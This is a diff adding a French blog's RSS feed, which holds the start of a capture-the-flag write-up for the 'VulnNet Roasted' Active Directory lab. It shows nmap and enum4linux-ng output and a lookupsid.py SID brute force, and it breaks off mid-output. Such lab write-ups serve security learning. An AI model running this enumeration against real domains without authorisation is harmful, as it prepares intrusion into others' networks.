@@ -1,0 +1,1127 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kerberos on Blog de Lukas</title><link>https://ticodevv.github.io/tags/kerberos/</link><description>Recent content in Kerberos on Blog de Lukas</description><generator>Hugo -- gohugo.io</generator><language>fr</language><lastBuildDate>Tue, 26 Mar 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://ticodevv.github.io/tags/kerberos/index.xml" rel="self" type="application/rss+xml"/><item><title>VulnNet Roasted</title><link>https://ticodevv.github.io/p/vulnnet-roasted/</link><pubDate>Tue, 26 Mar 2024 00:00:00 +0000</pubDate><guid>https://ticodevv.github.io/p/vulnnet-roasted/</guid><description>&lt;img src="https://ticodevv.github.io/p/vulnnet-roasted/img.png" alt="Featured image of post VulnNet Roasted" />&lt;h2 id="vulnnet-roasted">
+&lt;a href="#vulnnet-roasted">#&lt;/a>
+VulnNet Roasted
+&lt;/h2>&lt;h3 id="reconnaissance">
+&lt;a href="#reconnaissance">#&lt;/a>
+Reconnaissance
+&lt;/h3>&lt;h4 id="nmap">
+&lt;a href="#nmap">#&lt;/a>
+Nmap
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 11:38:12 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># nmap -A 10.10.211.33&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.93 &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2024-05-12 11:38 UTC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.211.33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.096s latency&lt;span class="o">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">990&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp filtered kerberos-sec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp filtered msrpc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp filtered netbios-ssn
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp filtered ldap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp filtered kpasswd5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp filtered http-rpc-epmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp filtered ldapssl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp filtered globalcatLDAP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp filtered globalcatLDAPssl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3389/tcp filtered ms-wbt-server
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Too many fingerprints match this host to give specific OS details
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Network Distance: &lt;span class="m">2&lt;/span> hops
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TRACEROUTE &lt;span class="o">(&lt;/span>using port 80/tcp&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HOP RTT ADDRESS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> 62.48 ms 10.8.0.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">2&lt;/span> 79.22 ms 10.10.211.33
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="ports-ouverts">
+&lt;a href="#ports-ouverts">#&lt;/a>
+Ports ouverts:
+&lt;/h4>&lt;ul>
+&lt;li>&lt;strong>88/tcp:&lt;/strong> Kerberos&lt;/li>
+&lt;li>&lt;strong>135/tcp:&lt;/strong> MSRPC (Microsoft Windows RPC)&lt;/li>
+&lt;li>&lt;strong>139/tcp:&lt;/strong> NetBIOS (Microsoft Windows netbios-ssn)&lt;/li>
+&lt;li>&lt;strong>389/tcp:&lt;/strong> LDAP (Lightweight Directory Access Protocol)&lt;/li>
+&lt;li>&lt;strong>464/tcp:&lt;/strong> Kpasswd5&lt;/li>
+&lt;li>&lt;strong>593/tcp:&lt;/strong> HTTP-RPC-EPMAP&lt;/li>
+&lt;li>&lt;strong>636/tcp:&lt;/strong> LDAPSSL&lt;/li>
+&lt;li>&lt;strong>3268/tcp:&lt;/strong> GlobalcatLDAP&lt;/li>
+&lt;li>&lt;strong>3269/tcp:&lt;/strong> GlobalcatLDAPssl&lt;/li>
+&lt;li>&lt;strong>3389/tcp:&lt;/strong> MS-WBT-SERVER (Microsoft Windows Remote Desktop)&lt;/li>
+&lt;/ul>
+&lt;h4 id="enum4linux">
+&lt;a href="#enum4linux">#&lt;/a>
+enum4linux
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;span class="lnt">87
+&lt;/span>&lt;span class="lnt">88
+&lt;/span>&lt;span class="lnt">89
+&lt;/span>&lt;span class="lnt">90
+&lt;/span>&lt;span class="lnt">91
+&lt;/span>&lt;span class="lnt">92
+&lt;/span>&lt;span class="lnt">93
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 11:41:25 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># enum4linux-ng -A 10.10.211.33&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ENUM4LINUX - next generation &lt;span class="o">(&lt;/span>v1.3.3&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">==========================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Target Information &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">==========================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target ........... 10.10.211.33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Username ......... &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Random Username .. &lt;span class="s1">&amp;#39;qadhxoqj&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Password ......... &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Timeout .......... &lt;span class="m">5&lt;/span> second&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=====================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Listener Scan on 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=====================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Checking LDAP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> LDAP is accessible on 389/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Checking LDAPS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> LDAPS is accessible on 636/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Checking SMB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> SMB is accessible on 445/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Checking SMB over NetBIOS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> SMB over NetBIOS is accessible on 139/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">====================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Domain Information via LDAP &lt;span class="k">for&lt;/span> 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">====================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying LDAP
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Appears to be root/parent DC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Long domain name is: vulnnet-rst.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===========================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> NetBIOS Names and Workgroup/Domain &lt;span class="k">for&lt;/span> 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===========================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Could not get NetBIOS names information via &lt;span class="s1">&amp;#39;nmblookup&amp;#39;&lt;/span>: timed &lt;span class="nv">out&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=========================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> SMB Dialect Check on 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=========================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying on 445/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Supported dialects and settings:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Supported dialects:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 1.0: &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 2.02: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 2.1: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 3.0: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMB 3.1.1: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Preferred dialect: SMB 3.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB1 only: &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB signing required: &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===========================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Domain Information via SMB session &lt;span class="k">for&lt;/span> 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===========================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerating via unauthenticated SMB session on 445/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found domain information via SMB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NetBIOS computer name: WIN-2BO8M1OE1M1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NetBIOS domain name: VULNNET-RST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DNS domain: vulnnet-rst.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FQDN: WIN-2BO8M1OE1M1.vulnnet-rst.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Derived membership: domain member
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Derived domain: VULNNET-RST
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=========================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> RPC Session Check on 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">=========================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Check &lt;span class="k">for&lt;/span> null session
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Could not establish null session: timed out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Check &lt;span class="k">for&lt;/span> random user
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Could not establish random user session: timed out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Sessions failed, neither null nor user sessions were &lt;span class="nv">possible&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===============================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> OS Information via RPC &lt;span class="k">for&lt;/span> 10.10.211.33 &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">===============================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerating via unauthenticated SMB session on 445/tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found OS information via SMB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerating via &lt;span class="s1">&amp;#39;srvinfo&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Skipping &lt;span class="s1">&amp;#39;srvinfo&amp;#39;&lt;/span> run, not possible with provided credentials
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> After merging OS information we have the following result:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS: Windows 10, Windows Server 2019, Windows Server &lt;span class="m">2016&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS version: &lt;span class="s1">&amp;#39;10.0&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS release: &lt;span class="s1">&amp;#39;1809&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS build: &lt;span class="s1">&amp;#39;17763&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Native OS: not supported
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Native LAN manager: not supported
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Platform id: null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server type: null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server &lt;span class="nb">type&lt;/span> string: null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>!&lt;span class="o">]&lt;/span> Aborting remainder of tests since sessions failed, rerun with valid credentials
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Completed after 60.57 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Les informations obtenues sont les suivantes:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Nom de l&amp;rsquo;ordinateur NetBIOS:&lt;/strong> WIN-2BO8M1OE1M1&lt;/li>
+&lt;li>&lt;strong>Nom de domaine NetBIOS:&lt;/strong> VULNNET-RST&lt;/li>
+&lt;li>&lt;strong>Domaine DNS:&lt;/strong> vulnnet-rst.local&lt;/li>
+&lt;li>&lt;strong>FQDN:&lt;/strong> WIN-2BO8M1OE1M1.vulnnet-rst.local&lt;/li>
+&lt;li>&lt;strong>OS:&lt;/strong> Windows 10, Windows Server 2019, Windows Server 2016&lt;/li>
+&lt;li>&lt;strong>Version de l&amp;rsquo;OS:&lt;/strong> 10.0&lt;/li>
+&lt;/ul>
+&lt;p>Une fois ça fais on peux regarder les SID du domaine avec &lt;code>rpcclient&lt;/code>:&lt;/p>
+&lt;p>C&amp;rsquo;set quoi un SID ?
+Le SID (Security Identifier) est un identifiant unique attribué à chaque compte utilisateur, groupe ou ordinateur dans un domaine Active Directory. Il est utilisé pour identifier de manière unique un objet ou une entité dans un domaine Active Directory.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 11:47:35 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># lookupsid.py guest@10.10.211.33&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket &lt;span class="k">for&lt;/span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright &lt;span class="m">2022&lt;/span> Fortra - forked by ThePorgs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Brute forcing SIDs at 10.10.211.33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> StringBinding ncacn_np:10.10.211.33&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\l&lt;/span>sarpc&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Domain SID is: S-1-5-21-1589833671-435344116-4136949213
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">498: VULNNET-RST&lt;span class="se">\E&lt;/span>nterprise Read-only Domain Controllers &lt;span class="o">(&lt;/span>SidTypeGroup&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">500: VULNNET-RST&lt;span class="se">\A&lt;/span>dministrator &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">501: VULNNET-RST&lt;span class="se">\G&lt;/span>uest &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">502: VULNNET-RST&lt;span class="se">\k&lt;/span>rbtgt &lt;span class="o">(&lt;/span>SidTypeUser&lt;span class="o">)&lt;/span>
